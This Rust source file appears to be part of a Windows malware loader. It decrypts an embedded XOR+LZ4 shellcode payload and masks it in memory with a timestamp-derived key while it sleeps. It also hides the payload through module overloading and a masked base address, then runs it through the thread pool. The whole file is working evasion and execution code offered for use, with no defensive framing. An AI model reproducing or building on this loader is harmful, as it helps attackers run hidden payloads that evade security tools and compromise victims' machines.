use core::ptr;
use std::sync::atomic::Ordering;
use winapi::ctypes::c_void;

#[cfg_attr(debug_assertions, derive(Debug))]
pub(crate) enum PayloadError {
    DllLoadFailed,
}

use std::sync::atomic::AtomicUsize;
static PAYLOAD_BASE: AtomicUsize = AtomicUsize::new(0);
static PAYLOAD_SIZE: AtomicUsize = AtomicUsize::new(0);

fn set_payload_region(base: *mut c_void, size: usize) {

    let masked = (base as usize) ^ (crate::stack_spoof::pool_key() as usize);
    PAYLOAD_BASE.store(masked, Ordering::SeqCst);
    PAYLOAD_SIZE.store(size, Ordering::SeqCst);
}

fn secure_zero(buf: &mut [u8]) {
    for b in buf {
        unsafe { ptr::write_volatile(b, 0) };
    }
}

pub(crate) fn prepare_payload_in_main_thread() -> Result<*mut c_void, PayloadError> {
    let mut sc: Vec<u8> = crate::config_payload::decode_payload();

    let _len = sc.len();

    crate::debug_log!("[PAYLOAD] Payload decoded: {} bytes", _len);

    unsafe {

        let mut shellcode = match crate::codec::decode_encrypted_payload(&sc) {
            Ok(decoded) => {
                crate::debug_log!("[PAYLOAD] XOR+LZ4 decoded: {} bytes", decoded.len());
                decoded
            }
            Err(_) => {

                crate::debug_log!("[PAYLOAD] Using raw shellcode: {} bytes", sc.len());
                std::mem::take(&mut sc)
            }
        };

        let jitter_key: u8 = {
            let tsc: u64;
            core::arch::asm!(
                "rdtsc",
                "shl rdx, 32",
                "or rax, rdx",
                out("rax") tsc,
                out("rdx") _,
                options(nostack, nomem, preserves_flags)
            );

            ((tsc & 0xFF) as u8) | 1
        };

        for b in shellcode.iter_mut() {
            ptr::write_volatile(b, *b ^ jitter_key);
        }
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);

        crate::timer_sleep::timer_sleep_jitter(3, 10);

        for b in shellcode.iter_mut() {
            ptr::write_volatile(b, *b ^ jitter_key);
        }
        core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);

        let entry_point = match crate::dualview::dual_view_write(&shellcode) {
            Some(addr) => {
                crate::debug_log!("[PAYLOAD] Module overloading completed");

                if let Some((base, size)) = crate::dualview::get_region() {
                    set_payload_region(base, size);
                    crate::debug_log!(
                        "[PAYLOAD] Region: base=0x{:X}, size={}",
                        base as usize, size
                    );
                }

                addr
            }
            None => {
                crate::debug_log!("[PAYLOAD] Dual view mapping failed aborting");
                secure_zero(&mut sc);
                secure_zero(&mut shellcode);
                return Err(PayloadError::DllLoadFailed);
            }
        };

        secure_zero(&mut shellcode);

        secure_zero(&mut sc);

        crate::PAYLOAD_READY.store(true, Ordering::SeqCst);

        crate::debug_log!("[PAYLOAD] Entry point resolved ({} bytes)", _len);

        Ok(entry_point)
    }
}

pub(crate) unsafe fn execute_payload_direct(entry_point: *mut winapi::ctypes::c_void) -> bool {
    crate::debug_log!("[EXEC] Payload execution start (thread pool)");

    if crate::threadpool::execute_via_threadpool(entry_point) {
        crate::debug_log!("[EXEC] Payload submitted to thread pool");
        return true;
    }

    crate::debug_log!("[EXEC] Thread pool unavailable, execution did not complete");
    false
}

